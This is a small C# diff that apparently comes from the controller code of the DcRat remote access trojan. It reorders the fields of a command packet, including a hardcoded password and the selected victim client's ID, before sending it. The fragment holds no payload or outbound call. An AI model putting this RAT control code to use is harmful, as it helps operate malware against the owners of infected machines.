@@ -221,11 +221,12 @@ namespace DcRat.ChildForms
             if (listViewHome.Tag != null)
             {
                 MsgPack msgpack = new MsgPack();
-                msgpack.ForcePathObject("Packet").AsString = "Controler";
-                msgpack.ForcePathObject("Client").AsString = ((ListViewItem)listViewHome.Tag).SubItems[3].Text;
-                msgpack.ForcePathObject("Type").AsString = "Command";
-                msgpack.ForcePathObject("Password").AsString = "qwqdanchun";
+                msgpack.ForcePathObject("Type").AsString = "Controler";
+                msgpack.ForcePathObject("Packet").AsString = "Command";
                 msgpack.ForcePathObject("HWID").AsString = Connection.HWID();
+                msgpack.ForcePathObject("Password").AsString = "qwqdanchun";
+
+                msgpack.ForcePathObject("Client").AsString = ((ListViewItem)listViewHome.Tag).SubItems[3].Text;                
                 Connection.Send(msgpack.Encode2Bytes());
             }
         }
